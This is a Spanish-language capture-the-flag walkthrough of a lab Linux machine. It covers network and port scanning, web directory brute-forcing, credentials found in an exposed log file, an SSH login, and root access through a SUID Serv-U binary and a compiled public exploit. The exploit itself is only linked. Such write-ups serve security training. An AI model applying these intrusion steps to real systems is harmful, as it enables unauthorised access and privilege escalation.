## Summary

Tags: #Linux #SSH #HTTP #SUID 

- IP -> 192.168.68.115 (VmWare)
- Ports -> TCP (80,22), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.6p1 
    - 80 -> Apache httpd 2.4.29

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)
* Ubuntu Bionic
## Recon

```bash
❯ arp-scan -I ens33 --localnet --ignoredups       # Para hacer un escaneo de la red local, no puedes encontrar mas usuarios despues del router que no pertenecen a tu red

	# Escaneamos la Capa 3 del modelo OSI con el protocolo ARP el cual lo hacer por medio de Broadcast en un segmento de la red, y provee el MAC Address
	# I = i mayuscula; es la interface ens33
	# ignoredups = Ignora IPs duplicadas
	 
	# apt install arp-scan  = Instalar ARP-Scan
```

```bash
❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)

	# IP = IP Address de la maquina target 
	# c = Numero de pings a ejecutar
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted

	#  p22,... = Indica los puertos que se quieren escanear
	#  sC = Lanza scripts básicos de enumeración
	#  sV = Enumera la versión y servicio que está corriendo en los puertos
	#  Target IP = Dirección IP que se quiere escanear
	#  oN targeted = Exporta el output a un fichero en formato nmap con nombre “targeted”
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

Este script se usa cuando solo esta el puerto 80 open en una maquina. 
```bash
❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

	#  -p80 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  -oN WebScan = Exporta el output a un fichero en formato nmap con nombre “WebScan”
```
Nos muestra que hay directorios como: **'robots.txt / phpinfo.php / phpmyadmin'**

* Ahora vemos la web con los dir encontrados 
	* En robots.txt encontramos: **admin, wordpress, user, election**

```bash 
❯ gobuster dir -u http://192.168.68.115/election -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200

	# dir -> Modo enumeracion directorios y archivos 
	# u -> Colocamos la url
	# t -> Lanzar peticiones en paralelo al mismo tiempo
	# w -> Ruta del diccionario

# Encontramos un dir llamado 'admin'

❯ gobuster dir -u http://192.168.68.115/election/admin -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
# Encontramos un dir llamado 'logs' el cual contiene un archivo llamado 'system.log' que contiene un usuario y su passwd. 
```

## User

Entramos por SSH y dentro de la maquina obtenemos la flag del usuario love
```bash
❯ ssh ❮User❯@❮IP❯                                  # Para conectarnos por ssh en el puerto default 22
```
## Root

Para escalar privilegios hacemos lo siguiente:

```bash 
❯ lsb_release -a          # Validamos el ubuntu 
❯ id                      # Miramos si estamos en algun grupo especial 
❯ sudo -l                 # Miramos si tenemos algun privilegio
```

```bash 
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 

	# Encontramos: Serv-U  --> Servidor FTP 
```

Buscamos en Google 'serv-u exploit' y  nos copiamos el exploit y lo pegarnos en un archivo que crearemos en el dir 'tmp' con nano llamado 'exploit.c'
* [Exploit-Serv-U](https://www.exploit-db.com/exploits/47009)

```bash 
❯ nano exploit.c             # Copiamos el contenido obtenido de la pagina web
```

```bash 
❯ which gcc                  # Para saber si la maquina victima tiene instalado el gcc
```

```bash 
❯ gcc exploit.c -o exploit      # Compilamos el exploit de la siguiente manera  
❯ ./exploit                     # Ejecutamos el exploit y ahora somos Root
```